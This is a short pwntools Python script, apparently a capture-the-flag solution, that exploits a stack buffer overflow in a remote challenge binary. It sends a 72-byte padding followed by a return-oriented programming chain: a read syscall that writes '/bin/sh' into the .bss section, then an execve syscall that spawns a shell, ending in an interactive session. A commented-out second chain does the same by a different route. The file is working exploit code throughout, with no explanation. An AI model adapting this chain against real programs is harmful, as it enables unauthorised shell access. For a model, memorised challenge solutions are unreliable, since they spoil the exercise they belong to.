from pwn import *

#p = process("./bin")
# p = gdb.debug(
#     "./bin",
#     """
#     break main
#     continue
#     """,
#     env={"LD_PRELOAD": "./libc.so.6"}
#     )
p = remote('cyberchallenge.disi.unitn.it', 9201)

'''
mov rdi, rsp
pop rax 
ret

mov rax, 59
mov rdi, 0x400000+0x0002004
mov rsi, 0
mov rdx, 0
syscall
'''

bss_address = 0x0000000000404020
mov_rdi_rsp = 0x0000000000401196

pop_rax = 0x0000000000401199 #pop rax; ret; 
pop_rdi = 0x000000000040119b #pop rdi; ret; 
pop_rdx = 0x000000000040119f #pop rdx; ret; 
pop_rsi = 0x000000000040119d #pop rsi; ret;
syscall = 0x00000000004011a3

offset = 72

# MOV SOLUTION

# payload = b'A'*offset+p64(mov_rdi_rsp)+b'/bin/sh\x00'
# payload += p64(pop_rax)
# payload += p64(59)
# payload += p64(pop_rsi)
# payload += p64(0)
# payload += p64(pop_rdx)
# payload += p64(0)
# payload += p64(syscall)

# READ SOLUTION

syscall_noRet = 0x00000000004011a3

payload = b'A'*offset
payload += p64(pop_rax)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(bss_address)
payload += p64(pop_rdx)
payload += p64(8)
payload += p64(syscall_noRet) # here the program will hang waiting for the input 
payload += p64(0xdeadbeef)

payload+=p64(pop_rax)
payload+=p64(59)
payload+=p64(pop_rdi)
payload+=p64(bss_address)
payload+=p64(pop_rsi)
payload+=p64(0)
payload+=p64(pop_rdx)
payload+=p64(0)
payload+=p64(syscall)


p.sendline(payload)  
p.sendline(b'/bin/sh\x00')

p.interactive()
